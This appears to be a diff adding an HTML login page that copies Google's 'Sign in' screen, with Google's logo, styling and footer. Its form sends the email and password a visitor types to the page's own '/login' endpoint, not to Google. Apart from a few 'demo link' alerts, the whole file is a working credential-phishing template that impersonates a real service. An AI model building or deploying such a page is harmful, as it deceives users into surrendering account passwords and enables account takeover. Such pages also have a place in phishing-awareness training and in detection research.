@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #202124;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+            padding: 48px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .logo {
+            height: 48px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 24px;
+        }
+        .input-group {
+            position: relative;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .links {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        .links a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .next-btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .next-btn:hover {
+            background-color: #1557b0;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        
+        <form id="loginForm" method="POST" action="/login">
+            <div class="input-group">
+                <input type="email" id="email" name="email" placeholder="Email or phone" required autofocus>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" id="password" name="passwd" placeholder="Password">
+            </div>
+
+            <div class="links">
+                <a href="#" onclick="alert('This is a demo link.'); return false;">Forgot email?</a>
+                <a href="#" onclick="alert('This is a demo link.'); return false;">Forgot password?</a>
+            </div>
+
+            <div class="buttons">
+                <a href="#" class="create-account" onclick="alert('This is a demo link.'); return false;">Create account</a>
+                <button type="submit" class="next-btn">Next</button>
+            </div>
+        </form>
+
+        <div class="footer">
+            <p>Google automatically links your Google Activity across your devices. Learn how this improves your experience.</p>
+            <p>Privacy & Terms - Help - Feedback</p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-focus email field
+        document.getElementById('email').focus();
+    </script>
+</body>
+</html>
